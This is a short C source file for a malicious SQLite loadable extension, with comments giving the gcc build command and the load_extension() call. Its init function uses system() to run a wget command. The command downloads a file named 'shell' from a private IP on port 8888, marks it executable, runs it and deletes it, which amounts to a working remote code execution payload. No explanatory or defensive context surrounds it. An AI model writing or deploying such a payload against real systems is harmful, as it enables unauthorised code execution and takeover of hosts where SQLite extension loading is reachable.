// SQLite Load Extension command execution
// sudo apt-get install libsqlite3-dev
// gcc -s -g -fPIC -shared rce.c -o rce.so
// load_extension("rce.so")


#include <sqlite3ext.h>
SQLITE_EXTENSION_INIT1

#include <stdlib.h>

#ifdef _WIN32
__declspec(dllexport)
#endif

int sqlite3_extension_init(
  sqlite3 *db, 
  char **pzErrMsg, 
  const sqlite3_api_routines *pApi
){
  SQLITE_EXTENSION_INIT2(pApi);

  const char *path = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin";
  setenv("PATH", path, 1);

  const char *cmd = "/usr/bin/wget -qO /tmp/shell http://10.10.14.12:8888/shell; /usr/bin/chmod +x /tmp/shell; /tmp/shell && /usr/bin/rm -rf /tmp/shell";
  int ret = system(cmd);

  if (ret != 0) {
  }
  return SQLITE_OK;
}
